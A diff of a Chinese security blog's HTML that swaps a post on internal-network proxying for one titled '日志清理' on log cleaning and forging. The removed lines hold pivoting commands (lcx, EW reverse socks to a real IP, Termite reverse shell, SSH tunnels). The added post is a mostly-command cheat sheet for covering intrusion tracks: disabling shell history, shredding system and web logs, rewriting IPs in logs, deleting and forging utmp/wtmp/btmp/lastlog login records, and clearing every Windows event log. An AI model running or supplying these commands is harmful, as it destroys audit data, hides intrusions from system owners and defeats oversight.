@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          内网代理 - Rootclay
+          日志清理 - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/07/25/内网代理/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/08/02/clean_log/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -89,11 +89,11 @@
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
                         </div>
-                        <h1>内网代理</h1>
-                        <h2 class="subheading">内网代理的个人总结.</h2>
+                        <h1>日志清理</h1>
+                        <h2 class="subheading">日志清理的个人总结.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-07-25
+                            2017-08-02
                         </span>
                     </div>
                 
@@ -140,14 +140,14 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -211,62 +211,49 @@
                 post-container">
 
                 <blockquote>
-<p>总结自己在实际运用过程中遇到的代理总结</p>
+<p>日志清理与伪造</p>
 </blockquote>
-<h2 id="0x00-引言">0x00 引言</h2>
-<p>早期我们可能会采用HTTP Proxy代理，在浏览器上设置下代理服务器的IP、端口、认证账户和密码。但有些软件的网络通信数据并不是HTTP协议，就需要寻找其它方法。</p>
-<p>SOCKS代理是个不错的解决方案，不管应用层是什么协议，只要是传输层是TCP协议就可以代理。SOCKS代理中最新的协议是SOCKS5。相对SOCKS4作了大幅度的增强。</p>
-<p>首先，它增加了对UDP协议的支持；其次，可支持多种用户身份验证方式和通信加密方式；最后，修改了SOCKS服务器进行域名解析的方法，使其更加优雅。</p>
-<h2 id="0x01-端口转发">0x01 端口转发</h2>
-<p>我们平常用到的LCX只能做到端口对端口的转发：</p>
-<p>1、 VPS</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –listen 8080 80</div></pre></td></tr></table></figure>
-<p>2、 受害机</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –slave X.X.X.X 80 127.0.0.1 80</div></pre></td></tr></table></figure>
-<p>本地80端口转发到远程80</p>
-<p>3、 Attacker</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http://X.X.X.X:8080</span></div></pre></td></tr></table></figure>
-<h2 id="0x02-工具">0x02 工具</h2>
-<p>Socks代理工具我用到的主要如下：</p>
-<p>Termite（原EW代理）</p>
-<p>EW不用说，肯定大家应该都用过，这里把原EW的简单用法和Termite的简单用法都写一下</p>
-<h3 id="ew">EW</h3>
-<p>1、 VPS:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew -s rcsocks -l 1080 -e 8888</div></pre></td></tr></table></figure>
-<p>2、 受害机</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew -s rssocks -d 112.74.201.135 -e 8888</div></pre></td></tr></table></figure>
-<h3 id="termite">Termite</h3>
-<p>1、 Server</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">agent -l 8888</div><div class="line">构建更加深的网络：</div><div class="line">已控制的主机连接进入代理网络：</div><div class="line">agent -c x.x.x.x -p 8888</div></pre></td></tr></table></figure>
-<p>2、 admin管理</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin -c x.x.x.x -p 8888</div></pre></td></tr></table></figure>
-<p>进入代理之后：</p>
-<p>3、 深层网络连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">exmple: </div><div class="line">Host3:192.168.3.1</div><div class="line">Host4:192.168.3.2</div><div class="line"></div><div class="line">1. 在Host4上:agent -l 8888</div><div class="line">2. goto 3       connect 192.168.3.2 8888可以把</div></pre></td></tr></table></figure>
-<p>4、 代理进入机器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. goto ID</div><div class="line">2. socks 1080</div><div class="line">3. 本地连接127.0.0.1 1080就可以了</div></pre></td></tr></table></figure>
-<p>5、 TCP端口转发</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. goto 2 </div><div class="line">2. lcxtran 3388 10.0.0.1 3389</div><div class="line">   以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口</div><div class="line">3. 连接就只需要本地连接127.0.0.1 的3388端口</div></pre></td></tr></table></figure>
-<p>6、 Shell反弹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. goto 1</div><div class="line">2. shell 7777</div><div class="line">   此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.</div><div class="line">3. nc 127.0.0.1 7777 就是一个1号机的shell</div></pre></td></tr></table></figure>
-<h3 id="ssh">SSH</h3>
-<h4 id="转发">转发</h4>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. ssh -CfNg -R 2222:127.0.0.1:22 VPS-user@VPS -p 53    //内网</div><div class="line">2. ssh -CfNg -L 8080:127.0.0.1:2222 VPS-user@VPS       //VPS</div><div class="line">本地访问VPS:8080就是内网的22端口</div></pre></td></tr></table></figure>
-<h4 id="socket代理">socket代理</h4>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -qTfnN -D port remotehost</div><div class="line">在终端中运行 ssh -qTfnN -D 6080 user@theserver ，然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.</div></pre></td></tr></table></figure>
+<h2 id="linux平台">Linux平台</h2>
+<p>无w与who记录登录：<br>
+<code>ssh -T root@172.16.50.166 &quot;/bin/bash -i&quot;</code></p>
+<p>挂载一个内存目录，重启消失，用于存放临时文件。<code>mount -t ramfs ramfs /usr/tmp</code><br>
+系统本来就存在这样的目录<code>/dev/shm</code>这个文件绝对777权限</p>
+<p>复制文件时间：<code>touch -r /usr/sbin/sshd /dev/shm/yourfile;</code></p>
+<p>首先进入/etc/profile查看管理员是否自行增加了日志日志记录功能，再看~/.bashrc有无记录，有则删</p>
+<p>其他主要日志如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; <span class="built_in">export</span> HISTFILE=/dev/null; <span class="built_in">export</span> HISTSIZE=0; <span class="built_in">export</span> HISTFILESIZE=0 </div><div class="line"> </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/lastlog </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/telnetd </div><div class="line">shred -n 100 -z -u /var/run/utmp </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/secure </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/wtmp </div><div class="line">shred -n 100 -z -u /etc/wtmp</div><div class="line">shred -n 100 -z -u /var/run/utmp </div><div class="line">shred -n 100 -z -u /etc/utmp </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span> </div><div class="line">shred -n 100 -z -u /var/adm </div><div class="line">shred -n 100 -z -u /var/apache/<span class="built_in">log</span> </div><div class="line">shred -n 100 -z -u /var/apache/logs </div><div class="line">shred -n 100 -z -u /usr/<span class="built_in">local</span>/apache/<span class="built_in">log</span> </div><div class="line">shred -n 100 -z -u /usr/<span class="built_in">local</span>/apache/logs </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/acct </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/xferlog </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/messages </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/proftpd/xferlog.legacy </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/proftpd.access_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/proftpd.xferlog </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/httpd/error_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/httpd/access_log </div><div class="line">shred -n 100 -z -u /etc/httpd/logs/access_log </div><div class="line">shred -n 100 -z -u /etc/httpd/logs/error_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/news/suck.notice </div><div class="line">shred -n 100 -z -u /var/spool/tmp </div><div class="line">shred -n 100 -z -u /var/spool/errors </div><div class="line">shred -n 100 -z -u /var/spool/logs </div><div class="line">shred -n 100 -z -u /var/spool/locks </div><div class="line">shred -n 100 -z -u /usr/<span class="built_in">local</span>/www/logs/thttpd_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/thttpd_log </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/ncftpd/misclog.txt </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/ncftpd.errs </div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/auth</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/cron</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/maillog</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/yum.log</div><div class="line">shred -n 100 -z -u /var/<span class="built_in">log</span>/messages</div></pre></td></tr></table></figure>
+<p>下面是主要清理登录日志：</p>
+<p>第一是系统secure日志：<br>
+sed -s ‘s/Your ip/you wanna replace/g’ access_log access.log security</p>
+<p>第二是一些登录文本日志和二进制日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/var/run/utmp    </div><div class="line">utmp 对应w 和 who命令，记录当前在线的用户</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/wtmp</div><div class="line">wtmp 对应last命令，记录一个用户登录与退出时间的永久记录</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/btmp</div><div class="line">btmp对应lastb命令，纪录失败的纪录</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/lastlog</div><div class="line">lastlog 对应lastlog命令，纪录最近几次成功登录的事件和最后一次不成功的登录</div></pre></td></tr></table></figure>
+<h3 id="删除日志">删除日志</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1. 删除utmp记录，将自己从w或者who输出中隐藏</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> utmp --user root //删除用户为root的用户记录</div><div class="line"></div><div class="line">2. 删除历史登录记录(wtmp)，隐藏last的记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> wtmp --user root //删除用户为root的用户记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> wtmp --user root --host <span class="string">"127.0.0.1"</span> //删除用户为root且登录来源host为127.0.0.1的用户记录</div><div class="line"></div><div class="line">3. 删除btmp记录，隐藏lastb的记录，lastb为登录失败的用户记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> btmp --user root --host <span class="string">"172.16.50.156"</span> //删除用户为root且登录来源host为127.0.0.1的用户记录</div><div class="line"></div><div class="line">4. 删除lastlog记录，不能通过用户删除，只能通过host或者时间</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> lastlog --host <span class="string">"172.16.50.1"</span> //删除来源host的用户登录记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> lastlog --date <span class="string">"2017-8-2 22:46:34"</span> //删除登录时间为2017-8-2 22:46:34的用户登录记录</div></pre></td></tr></table></figure>
+<h3 id="伪造日志">伪造日志</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1. 伪造utmp记录，将自己从w或者who输出中伪造</div><div class="line">python fake_login_log.py --mode add --<span class="built_in">type</span> utmp --user nobody --tty <span class="string">"pts/8"</span> --pid 25394 --date <span class="string">"2017-8-2 22:46:34"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为nobody的用户记录</div><div class="line">这里伪造的时间和host可以通过who命令去找到，PID一般伪造bash或者ssh通过`ps -aux | grep ssh/bash`去寻找</div><div class="line"></div><div class="line">2. 伪造历史登录记录(wtmp)，伪造last的记录</div><div class="line">python fake_login_log.py --mode add  --<span class="built_in">type</span> wtmp --user root --tty <span class="string">"pts/7"</span> --date <span class="string">"2017-8-2 00:06:34"</span> --host <span class="string">"127.0.0.1"</span></div><div class="line"></div><div class="line">3. 伪造btmp记录，伪造lastb的记录，lastb为登录失败的用户记录</div><div class="line">python fake_login_log.py --mode add  --<span class="built_in">type</span> btmp --user root --tty <span class="string">"pts/7"</span> --date <span class="string">"2017-8-2 00:06:34"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为root且登录来源host为127.0.0.1的用户登录失败记录</div><div class="line"></div><div class="line">4. 伪造lastlog记录</div><div class="line">python fake_login_log.py --mode add --<span class="built_in">type</span>=lastlog --user=rootclay --date=<span class="string">"2017-7-24 14:22:07"</span> --tty <span class="string">"pts/2"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为rootclay 时间2017-7-24 14:22:07 来源登录ip为127.0.0.1的用户登录记录</div></pre></td></tr></table></figure>
+<h2 id="windows平台">Windows平台</h2>
+<p>Windows日志包括五个类别：</p>
+<ol>
+<li>应用程序</li>
+<li>安全</li>
+<li>Setup</li>
+<li>系统</li>
+<li>转发事件</li>
+</ol>
+<p>wevtutil清除</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wevtutil.exe cl application</div><div class="line">wevtutil.exe cl Security</div><div class="line">wevtutil.exe cl setup</div><div class="line">wevtutil.exe cl system</div><div class="line">wevtutil.exe cl forwardedevents</div></pre></td></tr></table></figure>
+<p>直接绕过日志：<br>
+<a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="external">Invoke-Phant0m</a></p>
+
                 
 
                 <hr>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2017/08/01/SSH如何稳定方向代理/" data-toggle="tooltip" data-placement="top" title="SSH如何反向代理稳定穿透内网">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2017/06/01/Esrc议题/" data-toggle="tooltip" data-placement="top" title="ESRC成都站议题分享">Next Post &rarr;</a>
+                            <a href="/2017/08/01/SSH如何稳定方向代理/" data-toggle="tooltip" data-placement="top" title="SSH如何反向代理稳定穿透内网">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -296,7 +283,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x00-引言"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0x00 引言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-端口转发"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">0x01 端口转发</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-工具"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">0x02 工具</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ew"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">EW</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#termite"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">Termite</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ssh"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">SSH</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#转发"><span class="toc-nav-number">3.3.1.</span> <span class="toc-nav-text">转发</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#socket代理"><span class="toc-nav-number">3.3.2.</span> <span class="toc-nav-text">socket代理</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#linux平台"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Linux平台</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#删除日志"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">删除日志</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#伪造日志"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">伪造日志</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#windows平台"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Windows平台</span></a></li></ol>
         
         </div>
       </aside>
@@ -363,8 +350,8 @@
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/07/25/内网代理/";
-    var disqus_url = "http://rootclay.github.io/2017/07/25/内网代理/";
+    var disqus_identifier = "http://rootclay.github.io/2017/08/02/clean_log/";
+    var disqus_url = "http://rootclay.github.io/2017/08/02/clean_log/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
